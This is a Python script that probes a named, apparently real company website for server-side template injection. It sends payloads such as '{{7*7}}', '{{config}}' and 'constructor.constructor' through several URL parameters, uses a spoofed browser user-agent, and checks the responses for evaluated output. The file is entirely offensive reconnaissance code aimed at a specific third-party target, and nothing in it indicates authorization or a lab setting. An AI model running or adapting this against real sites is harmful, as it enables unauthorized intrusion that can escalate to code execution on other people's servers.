import requests, urllib.parse, time, random
B="https://www.infinitycapital.bh"
H={"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
   "Accept":"text/html,application/xhtml+xml,*/*;q=0.8","Accept-Language":"en-US,en;q=0.9"}
# SSTI arithmetic / expression markers
markers=[
 ("m1","{{7*7}}"),("m2","${7*7}"),("m3","#{7*7}"),("m4","<%= 7*7 %>"),
 ("m5","{{7*'7'}}"),("m6","{{config}}"),("m7","{{self.__class__}}"),
 ("m8","${{7*7}}"),("m9","{{constructor.constructor('return 1')()}}"),
 ("m10","*{7*7}"),("m11","{{= 7*7}}"),("m12","{% 7*7 %}"),
]
eps=["/api?id=%s","/?page=%s","/contact?cb=%s","/?id=%s","/?search=%s","/404?q=%s","/?q=%s","/api/?id=1&page=%s"]
for ep in eps:
    hits=[]
    for name,m in markers:
        url=B+ep % urllib.parse.quote(m,safe='')
        try:
            r=requests.get(url,headers=H,timeout=25,allow_redirects=False)
            body=r.text
            interesting = ('49' in body and ('{{' not in body)) or 'os.process' in body or 'config' in body.lower().split('title')[0][:0]
            echo = m.replace('%','') in body or m in body
            hits.append((name,r.status_code,len(body),echo,('49' in body)))
        except Exception as e:
            hits.append((name,'ERR',0,False,False))
        time.sleep(1.5)
    print("==",ep)
    for h in hits: print("   ",h)
